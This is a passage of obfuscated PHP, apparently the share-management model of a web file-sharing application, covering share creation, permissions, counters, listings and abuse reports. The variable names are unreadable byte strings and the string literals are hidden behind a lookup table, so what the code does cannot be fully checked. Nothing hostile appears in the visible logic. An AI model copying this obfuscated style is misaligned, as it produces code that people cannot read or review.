$_SERVER[Ãìšã«™]; $¼å—ˆ¹ˆ = isset($©çÁé¬Ÿ[0]) ? $©çÁé¬Ÿ[0] : !1; return array($ÄÏµ†ÀÈ[1952] => array(USER_ID, $ÄÏµ†ÀÈ[1953]), $ÄÏµ†ÀÈ[1897] => array($¼å—ˆ¹ˆ, $ÄÏµ†ÀÈ[1954])); } protected function listSimple() { $ş¸Ñöåå = array($_SERVER[Ãìšã«™][1650] => USER_ID); $‚©İÂÃÌ = $this->field($this->fieldList)->where($ş¸Ñöåå)->select(); return $‚©İÂÃÌ ? $‚©İÂÃÌ : array(); } protected function getInfo($Èšş¼®ß, $âğğ–¢Ô = false) { $ë“±³èª =& $_SERVER[Ãìšã«™]; if ($âğğ–¢Ô) { return $this->_getShareInfo(array($ë“±³èª[488] => $Èšş¼®ß)); } $Ğƒ©šİœ = $this->cacheFunctionGet($ë“±³èª[1899], $Èšş¼®ß); return $Ğƒ©šİœ; } public function getInfoByHash($Ãœºó´”) { return $this->_getShareInfo(array($_SERVER[Ãìšã«™][490] => $Ãœºó´”)); } public function getInfoByPath($ËğŸ°Ü) { $êú‹ÆÑ¤ =& $_SERVER[Ãìšã«™]; $Ö—ÜÚîö = array($êú‹ÆÑ¤[1650] => USER_ID, $êú‹ÆÑ¤[403] => $ËğŸ°Ü); return $this->_getShareInfo($Ö—ÜÚîö); } public function getInfoBySourcePath($±ÛÙ–«ñ) { $Ñ–¹÷Šì =& $_SERVER[Ãìšã«™]; $šÙœ™Ï = array($Ñ–¹÷Šì[1650] => USER_ID, $Ñ–¹÷Šì[1170] => $±ÛÙ–«ñ); return $this->_getShareInfo($šÙœ™Ï); } private function _getShareInfo($ÇÖÙİÔŞ) { $ƒÂù‰¨ =& $_SERVER[Ãìšã«™]; $øŞØè½ = $this->where($ÇÖÙİÔŞ)->find(); if (!$øŞØè½) { return !1; } $ÇÖÙİÔŞ = array($ƒÂù‰¨[488] => $øŞØè½[$ƒÂù‰¨[488]]); $¡¾ùÇŠ = $ƒÂù‰¨[1955]; $Ï³Š§•¿ = Model($ƒÂù‰¨[596])->order($ƒÂù‰¨[392])->field($¡¾ùÇŠ)->where($ÇÖÙİÔŞ)->select(); if ($øŞØè½[$ƒÂù‰¨[403]] == $ƒÂù‰¨[190]) { $øŞØè½[$ƒÂù‰¨[87]] = IO::info($øŞØè½[$ƒÂù‰¨[1170]]); } else { $øŞØè½[$ƒÂù‰¨[87]] = Model($ƒÂù‰¨[1321])->pathInfo($øŞØè½[$ƒÂù‰¨[403]]); } $øŞØè½[$ƒÂù‰¨[1956]] = $Ï³Š§•¿; return $øŞØè½; } protected function getInfoAuth($Öª«ÎÕ) { $×“µĞÑõ =& $_SERVER[Ãìšã«™]; $£…Ôúçí = $this->getInfo($Öª«ÎÕ); if ($£…Ôúçí[$×“µĞÑõ[1650]] == USER_ID) { $£…Ôúçí[$×“µĞÑõ[414]] = $£…Ôúçí[$×“µĞÑõ[87]][$×“µĞÑõ[414]]; } else { $£…Ôúçí[$×“µĞÑõ[414]] = Model($×“µĞÑõ[502])->authMake($£…Ôúçí[$×“µĞÑõ[1956]]); } return $£…Ôúçí; } protected function listData($†ÙÑã¯ = null, $Ø½ÍùŠä = 300) { $şÒõõÒ³ =& $_SERVER[Ãìšã«™]; $”†Î˜û = array(array($şÒõõÒ³[493] => array($şÒõõÒ³[1008], 0), $şÒõõÒ³[495] => array($şÒõõÒ³[1008], 0), $şÒõõÒ³[1957] => $şÒõõÒ³[1913])); if ($†ÙÑã¯ == $şÒõõÒ³[1958]) { $”†Î˜û = array($şÒõõÒ³[493] => 1); } else { if ($†ÙÑã¯ == $şÒõõÒ³[1155]) { $”†Î˜û = array($şÒõõÒ³[495] => 1); } } $”†Î˜û[$şÒõõÒ³[1650]] = USER_ID; $¦¨ˆ¥Ÿ± = $this->where($”†Î˜û)->selectPage($Ø½ÍùŠä); return $¦¨ˆ¥Ÿ±; } protected function listToMe($Ï¶›Ñ¿ì = 300) { $ŒØİÓÊı =& $_SERVER[Ãìšã«™]; $­…’´Ò» = Model($ŒØİÓÊı[1959])->userGroupParents(USER_ID); $ø¾´Êå = array($ŒØİÓÊı[580] => SourceModel::TYPE_USER, $ŒØİÓÊı[504] => USER_ID); if ($­…’´Ò») { $ø¾´Êå = array(array($ŒØİÓÊı[580] => SourceModel::TYPE_USER, $ŒØİÓÊı[504] => USER_ID), array($ŒØİÓÊı[580] => SourceModel::TYPE_GROUP, $ŒØİÓÊı[504] => array($ŒØİÓÊı[7], $­…’´Ò»)), $ŒØİÓÊı[1957] => $ŒØİÓÊı[1913]); } $ÎùÕ×ç = Model($ŒØİÓÊı[596])->where($ø¾´Êå)->selectPage($Ï¶›Ñ¿ì); $ñœõé® = array_to_keyvalue_group($ÎùÕ×ç[$ŒØİÓÊı[364]], $ŒØİÓÊı[488]); if (!$ñœõé®) { return $ÎùÕ×ç; } $Â¯»ë¬± = $ŒØİÓÊı[1960]; $ø¾´Êå = array($ŒØİÓÊı[488] => array($ŒØİÓÊı[419], array_keys($ñœõé®)), $ŒØİÓÊı[1650] => array($ŒØİÓÊı[1010], $ŒØİÓÊı[190])); $÷“ÎÕ˜ß = $this->field($Â¯»ë¬±)->where($ø¾´Êå)->select(); foreach ($÷“ÎÕ˜ß as $øÍÈÕ©É => &$ï™©´÷) { $ï™©´÷[$ŒØİÓÊı[1956]] = $ñœõé®[$ï™©´÷[$ŒØİÓÊı[488]]]; } unset($ï™©´÷); $Æ×Õçø´ = array($ŒØİÓÊı[1961] => $÷“ÎÕ˜ß, $ŒØİÓÊı[1962] => $ÎùÕ×ç[$ŒØİÓÊı[361]]); return $Æ×Õçø´; } protected function shareAdd($ºá½§ã, $õ¼ÀÕ ) { $‹­µÕÔ¹ =& $_SERVER[Ãìšã«™]; $û ¨êî = $this->_addShareData($ºá½§ã, $õ¼ÀÕ ); if (!empty($õ¼ÀÕ [$‹­µÕÔ¹[1963]])) { $this->_shareAuthSet($û ¨êî, $õ¼ÀÕ [$‹­µÕÔ¹[1963]]); } $this->shareEventAdd($ºá½§ã, $õ¼ÀÕ , $‹­µÕÔ¹[1158]); return $û ¨êî; } protected function shareAddSystem($Û­ÛÆ·À, $×¨Î†Ì´) { $×Œ¿Ø¼¿ =& $_SERVER[Ãìšã«™]; $‚ôÃ ¬ = $this->_addShareData($Û­ÛÆ·À, $×¨Î†Ì´, $×Œ¿Ø¼¿[1270]); $this->_shareAuthSet($‚ôÃ ¬, $×¨Î†Ì´[$×Œ¿Ø¼¿[1963]]); return $‚ôÃ ¬; } private function shareEventAdd($ÙŠú®¹í, $ÍŞ‡‡¯ı, $ÚËı×İĞ = "\x61\x64\144") { $‘˜ÔòäÃ =& $_SERVER[Ãìšã«™]; if (!$ÙŠú®¹í || $ÙŠú®¹í == $‘˜ÔòäÃ[190]) { return; } if ($ÚËı×İĞ == $‘˜ÔòäÃ[1158]) { if ($ÍŞ‡‡¯ı[$‘˜ÔòäÃ[493]] == $‘˜ÔòäÃ[89]) { Model($‘˜ÔòäÃ[564])->eventShare($ÙŠú®¹í, $‘˜ÔòäÃ[1964]); } if ($ÍŞ‡‡¯ı[$‘˜ÔòäÃ[495]] == $‘˜ÔòäÃ[89]) { Model($‘˜ÔòäÃ[564])->eventShare($ÙŠú®¹í, $‘˜ÔòäÃ[1965]); } return; } $ªı—Î¡İ = $this->getInfoByPath($ÙŠú®¹í); $Åó€ö«À = $‘˜ÔòäÃ[1966]; if ($ªı—Î¡İ[$‘˜ÔòäÃ[493]] == $‘˜ÔòäÃ[190] && $ÍŞ‡‡¯ı[$‘˜ÔòäÃ[493]] == $‘˜ÔòäÃ[89]) { $Åó€ö«À = $‘˜ÔòäÃ[1964]; } if ($ªı—Î¡İ[$‘˜ÔòäÃ[493]] == $‘˜ÔòäÃ[89] && $ÍŞ‡‡¯ı[$‘˜ÔòäÃ[493]] == $‘˜ÔòäÃ[190]) { $Åó€ö«À = $‘˜ÔòäÃ[1967]; } if ($ªı—Î¡İ[$‘˜ÔòäÃ[495]] == $‘˜ÔòäÃ[190] && $ÍŞ‡‡¯ı[$‘˜ÔòäÃ[495]] == $‘˜ÔòäÃ[89]) { $Åó€ö«À = $‘˜ÔòäÃ[1965]; } if ($ªı—Î¡İ[$‘˜ÔòäÃ[495]] == $‘˜ÔòäÃ[89] && $ÍŞ‡‡¯ı[$‘˜ÔòäÃ[495]] == $‘˜ÔòäÃ[190]) { $Åó€ö«À = $‘˜ÔòäÃ[1968]; } Model($‘˜ÔòäÃ[564])->eventShare($ÙŠú®¹í, $Åó€ö«À); return; } private function _addShareData($‚€ÎË»“, $ãÉ“Â× = array(), $•û¼ş‰ = false) { $—¿¥ü² =& $_SERVER[Ãìšã«™]; $‰¹…Šù­ = $•û¼ş‰ == $—¿¥ü²[1270] ? 0 : USER_ID; $æµˆŠÀ® = array($—¿¥ü²[418] => $‚€ÎË»“, $—¿¥ü²[1641] => $‰¹…Šù­); if ($‚€ÎË»“ == 0) { $æµˆŠÀ® = array($—¿¥ü²[1969] => $ãÉ“Â×[$—¿¥ü²[1170]], $—¿¥ü²[1641] => $‰¹…Šù­); } if ($ ‹€š¨© = $this->where($æµˆŠÀ®)->find()) { return $ ‹€š¨©[$—¿¥ü²[488]]; } if ($‚€ÎË»“ == 0) { $ˆ¿é˜…“ = array($—¿¥ü²[32] => get_path_this($ãÉ“Â×[$—¿¥ü²[78]])); } else { $ˆ¿é˜…“ = Model($—¿¥ü²[826])->sourceInfo($‚€ÎË»“); if (!$ˆ¿é˜…“) { return !1; } } if (!$ãÉ“Â×[$—¿¥ü²[1548]]) { $ãÉ“Â×[$—¿¥ü²[1548]] = $ˆ¿é˜…“[$—¿¥ü²[32]]; } $‚ûãõôò = array($—¿¥ü²[1641] => $‰¹…Šù­, $—¿¥ü²[418] => $‚€ÎË»“, $—¿¥ü²[1548] => $—¿¥ü²[12], $—¿¥ü²[493] => 0, $—¿¥ü²[495] => 0, $—¿¥ü²[1170] => $—¿¥ü²[12], $—¿¥ü²[302] => $—¿¥ü²[12], $—¿¥ü²[885] => $—¿¥ü²[12], $—¿¥ü²[1970] => 0, $—¿¥ü²[1971] => 0, $—¿¥ü²[496] => 0, $—¿¥ü²[497] => $—¿¥ü²[12], $—¿¥ü²[490] => $—¿¥ü²[12]); $Û’Úßüä = explode($—¿¥ü²[50], $—¿¥ü²[1972]); foreach ($Û’Úßüä as $š¤†É™ƒ) { if (!isset($ãÉ“Â×[$š¤†É™ƒ])) { continue; } $‚ûãõôò[$š¤†É™ƒ] = $ãÉ“Â×[$š¤†É™ƒ]; } $é—ÅøÙ³ = $this->add($‚ûãõôò); $ÖÎœ•×Û = array($—¿¥ü²[490] => short_id($é—ÅøÙ³)); $this->where(array($—¿¥ü²[487] => $é—ÅøÙ³))->save($ÖÎœ•×Û); return $é—ÅøÙ³; } private function _shareAuthSet($çŠÖôã, $Û”™²øÅ) { $€²‡‰Ù =& $_SERVER[Ãìšã«™]; if (!is_array($Û”™²øÅ)) { return !1; } $çÇ²™âÑ = Model($€²‡‰Ù[1923]); $çÇ²™âÑ->where(array($€²‡‰Ù[488] => $çŠÖôã))->delete(); $¡ù¯Èò = array(); foreach ($Û”™²øÅ as $µùƒ±«) { $Ñüò¾Š¾ = SourceModel::TYPE_USER; if ($µùƒ±«[$€²‡‰Ù[412]] == SourceModel::TYPE_GROUP) { $Ñüò¾Š¾ = SourceModel::TYPE_GROUP; } $úç·Û¿‰ = array($€²‡‰Ù[488] => $çŠÖôã, $€²‡‰Ù[412] => $Ñüò¾Š¾, $€²‡‰Ù[504] => intval($µùƒ±«[$€²‡‰Ù[504]]), $€²‡‰Ù[1919] => 0, $€²‡‰Ù[1973] => -1); if ($µùƒ±«[$€²‡‰Ù[1919]]) { $úç·Û¿‰[$€²‡‰Ù[1919]] = $µùƒ±«[$€²‡‰Ù[1919]]; } else { if ($µùƒ±«[$€²‡‰Ù[1973]]) { $úç·Û¿‰[$€²‡‰Ù[1973]] = $µùƒ±«[$€²‡‰Ù[1973]]; } } $¡ù¯Èò[] = $úç·Û¿‰; } return $çÇ²™âÑ->addAll($¡ù¯Èò, array(), !0); } public function numViewAdd($Èô÷€¿’) { $½õÜÎÀ² =& $_SERVER[Ãìšã«™]; $¦¸á¡šÔ = array($½õÜÎÀ²[487] => $Èô÷€¿’); $this->where($¦¸á¡šÔ)->setAdd($½õÜÎÀ²[1970]); } public function numDownloadAdd($óº¢¤£Ñ) { $ˆì•â‡ =& $_SERVER[Ãìšã«™]; $¢Àµ÷£ = array($ˆì•â‡[487] => $óº¢¤£Ñ); $this->where($¢Àµ÷£)->setAdd($ˆì•â‡[1971]); } protected function shareEdit($Œ¸íáŞ´, $Ó´ªô²Á) { $ª¸¼Ì²˜ =& $_SERVER[Ãìšã«™]; $Í—ŒåÍ¢ = $this->getInfo($Œ¸íáŞ´); if (!$Í—ŒåÍ¢) { return !1; } $this->_checkLinkShare($Ó´ªô²Á, $Í—ŒåÍ¢); $¸é»„Ü» = array(); $ïğìŞì = explode($ª¸¼Ì²˜[50], $ª¸¼Ì²˜[1974]); foreach ($ïğìŞì as $€µ—ù£) { if (!array_key_exists($€µ—ù£, $Ó´ªô²Á)) { continue; } $¸é»„Ü»[$€µ—ù£] = $Ó´ªô²Á[$€µ—ù£]; } $this->shareEventAdd($Í—ŒåÍ¢[$ª¸¼Ì²˜[403]], $Ó´ªô²Á, $ª¸¼Ì²˜[1788]); $this->where(array($ª¸¼Ì²˜[487] => $Œ¸íáŞ´))->save($¸é»„Ü»); if (isset($Ó´ªô²Á[$ª¸¼Ì²˜[1963]])) { $this->_shareAuthSet($Œ¸íáŞ´, $Ó´ªô²Á[$ª¸¼Ì²˜[1963]]); } return !0; } private function _checkLinkShare($ËĞ©îÔ”, $ÔÆ¯Ìàƒ) { $ÕÇ¡§’– =& $_SERVER[Ãìšã«™]; if ($ËĞ©îÔ”[$ÕÇ¡§’–[493]] != $ÕÇ¡§’–[89]) { return; } $Î™Ş‹—Ø = $ÔÆ¯Ìàƒ[$ÕÇ¡§’–[87]][$ÕÇ¡§’–[403]]; if ($ÔÆ¯Ìàƒ[$ÕÇ¡§’–[87]][$ÕÇ¡§’–[33]] != $ÕÇ¡§’–[192]) { $÷¦Ò…² = $this->_folderReport($Î™Ş‹—Ø); if (!$÷¦Ò…²) { return; } show_json(LNG($ÕÇ¡§’–[1975]) . $ÕÇ¡§’–[1976] . $÷¦Ò…², !1); } $•€„¯š° = Model($ÕÇ¡§’–[826])->fileInfoGet($ÔÆ¯Ìàƒ[$ÕÇ¡§’–[87]][$ÕÇ¡§’–[403]]); if (!$•€„¯š°) { return; } $’”ÑËà” = $this->shareFileMeta($•€„¯š°[$ÕÇ¡§’–[467]]); if (isset($’”ÑËà”[$ÕÇ¡§’–[369]]) && $’”ÑËà”[$ÕÇ¡§’–[369]] == $ÕÇ¡§’–[89]) { show_json(LNG($ÕÇ¡§’–[1977]), !1); } } private function _folderReport($º«ŒÁ§) { $í÷Û±»£ =& $_SERVER[Ãìšã«™]; $ôÚÁÇ•Š = array($í÷Û±»£[467] => array($í÷Û±»£[1008], 0), $í÷Û±»£[751] => 3); $Ì¨ÂÅáú = Model($í÷Û±»£[1978])->where($ôÚÁÇ•Š)->field($í÷Û±»£[467])->select(); if (!$Ì¨ÂÅáú) { return !1; } $Ì¨ÂÅáú = array_to_keyvalue($Ì¨ÂÅáú, $í÷Û±»£[12], $í÷Û±»£[467]); $’³ò‡Áè = $í÷Û±»£[50] . $º«ŒÁ§ . $í÷Û±»£[50]; $ôÚÁÇ•Š = array($í÷Û±»£[467] => array($í÷Û±»£[7], $Ì¨ÂÅáú), $í÷Û±»£[521] => array($í÷Û±»£[378], "\x25{$’³ò‡Áè}\45"), $í÷Û±»£[431] => 0); $ó„Íüú = Model($í÷Û±»£[826])->where($ôÚÁÇ•Š)->field($í÷Û±»£[1979])->find(); if (!$ó„Íüú) { return !1; } $ ¬„ˆ = substr($ó„Íüú[$í÷Û±»£[521]], strpos($ó„Íüú[$í÷Û±»£[521]], $’³ò‡Áè)); $ôÚÁÇ•Š = array($í÷Û±»£[403] => array($í÷Û±»£[7], trim($ ¬„ˆ, $í÷Û±»£[50]))); $Ò¤ãÆ›· = Model($í÷Û±»£[826])->where($ôÚÁÇ•Š)->field($í÷Û±»£[32])->select(); $Ä”ê†¨ = array_to_keyvalue($Ò¤ãÆ›·, $í÷Û±»£[12], $í÷Û±»£[32]); $Ä”ê†¨[] = $ó„Íüú[$í÷Û±»£[32]]; return implode($í÷Û±»£[8], $Ä”ê†¨); } protected function remove($ƒŠ”ÕÃö) { $¸êÁØãœ =& $_SERVER[Ãìšã«™]; if (is_array($ƒŠ”ÕÃö)) { $ƒŠ”ÕÃö = array($¸êÁØãœ[7], $ƒŠ”ÕÃö); } $üá±áäÖ = array($¸êÁØãœ[488] => $ƒŠ”ÕÃö); $¶éºÌâñ = $this->where($üá±áäÖ)->delete(); if ($¶éºÌâñ) { Model($¸êÁØãœ[596])->where(array($¸êÁØãœ[488] => $ƒŠ”ÕÃö))->delete(); } $óïå”ìè = is_array($ƒŠ”ÕÃö) ? $ƒŠ”ÕÃö[1] : array($ƒŠ”ÕÃö); for ($”İ’˜ë– = 0; $”İ’˜ë– < count($óïå”ìè); $”İ’˜ë–++) { $„”åËÜ¹ = $this->getInfo($óïå”ìè[$”İ’˜ë–]); if ($„”åËÜ¹[$¸êÁØãœ[495]] == $¸êÁØãœ[89]) { Model($¸êÁØãœ[564])->eventShare($„”åËÜ¹[$¸êÁØãœ[403]], $¸êÁØãœ[1968]); } if ($„”åËÜ¹[$¸êÁØãœ[493]] == $¸êÁØãœ[89]) { Model($¸êÁØãœ[564])->eventShare($„”åËÜ¹[$¸êÁØãœ[403]], $¸êÁØãœ[1967]); } } return $¶éºÌâñ; } protected function removeBySource($”¯–Ÿ±È) { $­¡áËöì =& $_SERVER[Ãìšã«™]; $ÇÜ¶”÷× = array($­¡áËöì[418] => array($­¡áËöì[419], $”¯–Ÿ±È)); $çåíÓâÚ = $this->field($­¡áËöì[488])->where($ÇÜ¶”÷×)->select(); $çåíÓâÚ = array_to_keyvalue($çåíÓâÚ, $­¡áËöì[12], $­¡áËöì[488]); if (!$çåíÓâÚ) { return; } $ÇÜ¶”÷× = array($­¡áËöì[487] => array($­¡áËöì[419], $çåíÓâÚ)); $this->where($ÇÜ¶”÷×)->delete(); Model($­¡áËöì[596])->where($ÇÜ¶”÷×)->delete(); } public function listAll($ö“ı™ò€) { $°ğêı˜è =& $_SERVER[Ãìšã«™]; $Î‰Áïƒš = array(); if ($ö“ı™ò€[$°ğêı˜è[1650]]) { $Î‰Áïƒš[$°ğêı˜è[1650]] = $ö“ı™ò€[$°ğêı˜è[1650]]; } if ($ö“ı™ò€[$°ğêı˜è[762]]) { $ñÈÆµùÎ = $ö“ı™ò€[$°ğêı˜è[496]] ? $ö“ı™ò€[$°ğêı˜è[496]] : strtotime(date($°ğêı˜è[1980])); $Î‰Áïƒš[$°ğêı˜è[193]] = array($°ğêı˜è[328], array($ö“ı™ò€[$°ğêı˜è[762]], $ñÈÆµùÎ)); } if ($ö“ı™ò€[$°ğêı˜è[33]]) { $Î‰Áïƒš[$ö“ı™ò€[$°ğêı˜è[33]]] = 1; } else { $Î‰Áïƒš[] = array($°ğêı˜è[493] => array($°ğêı˜è[1008], 0), $°ğêı˜è[495] => array($°ğêı˜è[1008], 0), $°ğêı˜è[1957] => $°ğêı˜è[1913]); } if ($ö“ı™ò€[$°ğêı˜è[1909]]) { $Î‰Áïƒš[] = array($°ğêı˜è[490] => $ö“ı™ò€[$°ğêı˜è[1909]], $°ğêı˜è[1548] => array($°ğêı˜è[378], "\x25{$ö“ı™ò€[$°ğêı˜è[1909]]}\x25"), $°ğêı˜è[1957] => $°ğêı˜è[1913]); } $ó²²Ñº¤ = $this->_makeOrder()->where($Î‰Áïƒš)->selectPage(20); if (empty($ó²²Ñº¤[$°ğêı˜è[364]])) { return array(); } $this->_listDataApply($ó²²Ñº¤[$°ğêı˜è[364]]); return $ó²²Ñº¤; } public function listDataApply($Å Ûı–­) { $this->_listDataApply($Å Ûı–­); return $Å Ûı–­; } private function _listDataApply(&$‚œÀ‹) { $ûê®äƒ =& $_SERVER[Ãìšã«™]; $Ç»“ê“Ò = array_to_keyvalue($‚œÀ‹, $ûê®äƒ[12], $ûê®äƒ[1650]); $Ñ·ˆê‹Ï = Model($ûê®äƒ[538])->userListInfo(array_unique($Ç»“ê“Ò)); $¶‰Õ§©Ğ = array_to_keyvalue($‚œÀ‹, $ûê®äƒ[12], $ûê®äƒ[403]); $¥ÙáÊç = Model($ûê®äƒ[826])->sourceListInfo($¶‰Õ§©Ğ, !0); foreach ($‚œÀ‹ as $İšÙÇÌë => &$Êš›÷ì) { $”ÒÔîš = $Êš›÷ì[$ûê®äƒ[1650]]; $Êš›÷ì[$ûê®äƒ[1981]] = $Ñ·ˆê‹Ï[$”ÒÔîš] ? $Ñ·ˆê‹Ï[$”ÒÔîš] : !1; $ËßÄ„æ = $Êš›÷ì[$ûê®äƒ[403]]; $Êš›÷ì[$ûê®äƒ[87]] = $¥ÙáÊç[$ËßÄ„æ] ? $¥ÙáÊç[$ËßÄ„æ] : !1; if ($Êš›÷ì[$ûê®äƒ[87]][$ûê®äƒ[431]] == $ûê®äƒ[89]) { unset($‚œÀ‹[$İšÙÇÌë]); } if ($Êš›÷ì[$ûê®äƒ[87]] != $ûê®äƒ[190] && !$Êš›÷ì[$ûê®äƒ[87]]) { unset($‚œÀ‹[$İšÙÇÌë]); } } unset($Êš›÷ì); $‚œÀ‹ = array_values($‚œÀ‹); } private function _makeOrder($Œ÷°€ğ© = '') { $½À¡£š› =& $_SERVER[Ãìšã«™]; $Ü³™’©Í = array($½À¡£š›[193], $½À¡£š›[496], $½À¡£š›[1970], $½À¡£š›[1971]); $üÀôá † = array($½À¡£š›[448] => $½À¡£š›[449], $½À¡£š›[450] => $½À¡£š›[451]); $ßã‘ú… = Input::get($½À¡£š›[455], $½À¡£š›[7], $½À¡£š›[424], $Ü³™’©Í); $ñ’‚Â‘Ş = Input::get($½À¡£š›[456], $½À¡£š›[7], $½À¡£š›[1982], array($½À¡£š›[1908], $½À¡£š›[450])); $ñ’‚Â‘Ş = $üÀôá †[$ñ’‚Â‘Ş]; $Œ÷°€ğ© = $Œ÷°€ğ© . "{$ßã‘ú…}\x20{$ñ’‚Â‘Ş}"; return $this->order($Œ÷°€ğ©); } public function reportAdd($šÉ¢Ö¯) { $ºŞæá¿¡ =& $_SERVER[Ãìšã«™]; $»˜’ÚÄ = array($ºŞæá¿¡[488] => $šÉ¢Ö¯[$ºŞæá¿¡[488]], $ºŞæá¿¡[1650] => USER_ID); if (Model($ºŞæá¿¡[1978])->where($»˜’ÚÄ)->find()) { return !1; } $ÕÜ¦Õâ = array($ºŞæá¿¡[488] => $šÉ¢Ö¯[$ºŞæá¿¡[488]], $ºŞæá¿¡[1548] => $šÉ¢Ö¯[$ºŞæá¿¡[1548]], $ºŞæá¿¡[403] => $šÉ¢Ö¯[$ºŞæá¿¡[403]], $ºŞæá¿¡[467] => $šÉ¢Ö¯[$ºŞæá¿¡[467]], $ºŞæá¿¡[1650] => USER_ID, $ºŞæá¿¡[33] => $šÉ¢Ö¯[$ºŞæá¿¡[33]], $ºŞæá¿¡[451] => $šÉ¢Ö¯[$ºŞæá¿¡[451]]); return Model($ºŞæá¿¡[1978])->add($ÕÜ¦Õâ); } public function reportList($“èôÌºÄ) { $ĞÕ…È÷Å =& $_SERVER[Ãìšã«™]; $´ìáÏ³ı = array(); if ($“èôÌºÄ[$ĞÕ…È÷Å[762]]) { $ğÌõˆĞ× = $“èôÌºÄ[$ĞÕ…È÷Å[496]] ? $“èôÌºÄ[$ĞÕ…È÷Å[496]] : strtotime(date($ĞÕ…È÷Å[1980])); $´ìáÏ³ı[$ĞÕ…È÷Å[193]] = array($ĞÕ…È÷Å[328], array($“èôÌºÄ[$ĞÕ…È÷Å[762]], $ğÌõˆĞ×)); } if (isset($“èôÌºÄ[$ĞÕ…È÷Å[33]]) && in_array($“èôÌºÄ[$ĞÕ…È÷Å[33]], array($ĞÕ…È÷Å[89], $ĞÕ…È÷Å[435], $ĞÕ…È÷Å[1983], $ĞÕ…È÷Å[1984], $ĞÕ…È÷Å[1985]))) { $´ìáÏ³ı[$ĞÕ…È÷Å[33]] = $“èôÌºÄ[$ĞÕ…È÷Å[33]]; } if (isset($“èôÌºÄ[$ĞÕ…È÷Å[751]]) && in_array($“èôÌºÄ[$ĞÕ…È÷Å[751]], array($ĞÕ…È÷Å[190], $ĞÕ…È÷Å[89], $ĞÕ…È÷Å[435], $ĞÕ…È÷Å[1983]))) { $´ìáÏ³ı[$ĞÕ…È÷Å[751]] = $“èôÌºÄ[$ĞÕ…È÷Å[751]]; } $ªŞÙ…¦Ù = Input::get($ĞÕ…È÷Å[456], $ĞÕ…È÷Å[7], $ĞÕ…È÷Å[1982], array($ĞÕ…È÷Å[1908], $ĞÕ…È÷Å[450])); $¿ìÒúí» = array($ĞÕ…È÷Å[448] => $ĞÕ…È÷Å[449], $ĞÕ…È÷Å[450] => $ĞÕ…È÷Å[451]); $â—Ê²â¥ = $ĞÕ…È÷Å[1986] . $¿ìÒúí»[$ªŞÙ…¦Ù]; $¶ø¹Ùúæ = Model($ĞÕ…È÷Å[1978])->where($´ìáÏ³ı)->order($â—Ê²â¥)->selectPage(20); if (empty($¶ø¹Ùúæ[$ĞÕ…È÷Å[364]])) { return array(); } $½ÀÛ²«¿ = array_to_keyvalue_group($¶ø¹Ùúæ[$ĞÕ…È÷Å[364]], $ĞÕ…È÷Å[751], $ĞÕ…È÷Å[488]); if (!empty($½ÀÛ²«¿[0])) { $“èôÌºÄ = $½ÀÛ²«¿[0]; $´ìáÏ³ı = array($ĞÕ…È÷Å[488] => array($ĞÕ…È÷Å[7], $“èôÌºÄ)); $ÓÜŠïê³ = $this->where($´ìáÏ³ı)->field($ĞÕ…È÷Å[488])->select(); $ÓÜŠïê³ = array_to_keyvalue($ÓÜŠïê³, $ĞÕ…È÷Å[12], $ĞÕ…È÷Å[488]); $ÊŸÀ¬³Â = array_diff($“èôÌºÄ, $ÓÜŠïê³); if (!empty($ÊŸÀ¬³Â)) { foreach ($¶ø¹Ùúæ[$ĞÕ…È÷Å[364]] as $™Â—á¨ü => $¨à¿µÍé) { if (in_array($¨à¿µÍé[$ĞÕ…È÷Å[488]], $ÊŸÀ¬³Â)) { unset($¶ø¹Ùúæ[$ĞÕ…È÷Å[364]][$™Â—á¨ü]); } } } } $this->_listDataApply($¶ø¹Ùúæ[$ĞÕ…È÷Å[364]]); return $¶ø¹Ùúæ; } public function reportStatus($”øªì•Î) { $¥Ş¸õ˜Á =& $_SERVER[Ãìšã«™]; $ö¬õ‡¾¬ = array($¥Ş¸õ˜Á[392] => $”øªì•Î[$¥Ş¸õ˜Á[392]]); $Êª¥ÂÚ¡ = Model($¥Ş¸õ˜Á[1978])->where($ö¬õ‡¾¬)->field($¥Ş¸õ˜Á[1987])->find(); if (!$Êª¥ÂÚ¡) { return !1; } $ÁÎéä¶ñ = array($¥Ş¸õ˜Á[751] => $”øªì•Î[$¥Ş¸õ˜Á[751]]); if ($”øªì•Î[$¥Ş¸õ˜Á[751]] == $¥Ş¸õ˜Á[1983] && $Êª¥ÂÚ¡[$¥Ş¸õ˜Á[751]] == $¥Ş¸õ˜Á[1983]) { $ÁÎéä¶ñ[$¥Ş¸õ˜Á[751]] = 0; } $Á¾ëÉ´ = Model($¥Ş¸õ˜Á[1978])->where($ö¬õ‡¾¬)->save($ÁÎéä¶ñ); if ($”øªì•Î[$¥Ş¸õ˜Á[751]] == $¥Ş¸õ˜Á[435]) { if ($Êª¥ÂÚ¡[$¥Ş¸õ˜Á[467]] != $¥Ş¸õ˜Á[190] && $this->shareFileMeta($Êª¥ÂÚ¡[$¥Ş¸õ˜Á[467]])) { $this->shareFileMeta($Êª¥ÂÚ¡[$¥Ş¸õ˜Á[467]], 0); } $this->remove($Êª¥ÂÚ¡[$¥Ş¸õ˜Á[488]]); return !0; } if ($Á¾ëÉ´ && $”øªì•Î[$¥Ş¸õ˜Á[751]] == $¥Ş¸õ˜Á[1983]) { $àŠÉ¬· = $ÁÎéä¶ñ[$¥Ş¸õ˜Á[751]] == $¥Ş¸õ˜Á[1983] ? 1 : 0; $this->shareFileMeta($Êª¥ÂÚ¡[$¥Ş¸õ˜Á[467]], $àŠÉ¬·); $this->removeByFile($Êª¥ÂÚ¡[$¥Ş¸õ˜Á[467]]); } return $Á¾ëÉ´; } private function removeByFile($êÛ”Ì…) { $Ş“’ª–Ø =& $_SERVER[Ãìšã«™]; $ıÙ­Œ¡Î = Model($Ş“’ª–Ø[826])->where(array($Ş“’ª–Ø[467] => $êÛ”Ì…))->field($Ş“’ª–Ø[403])->select(); $ÈĞ‘È = array_to_keyvalue($ıÙ­Œ¡Î, $Ş“’ª–Ø[12], $Ş“’ª–Ø[403]); $©ÅÊõïÓ = array($Ş“’ª–Ø[403] => array($Ş“’ª–Ø[7], $ÈĞ‘È), $Ş“’ª–Ø[493] => 1); $ıÙ­Œ¡Î = $this->where($©ÅÊõïÓ)->field($Ş“’ª–Ø[488])->select(); if (empty($ıÙ­Œ¡Î)) { return; } $ßÄä¨‘ = array_to_keyvalue($ıÙ­Œ¡Î, $Ş“’ª–Ø[12], $Ş“’ª–Ø[488]); $this->remove($ßÄä¨‘); } private function shareFileMeta($³ëÜÙ, $ò¡ÏÓµÔ = null) { $êÃÜÌ’¡ =& $_SERVER[Ãìšã«™]; $àÛöıÁ = array($êÃÜÌ’¡[467] => 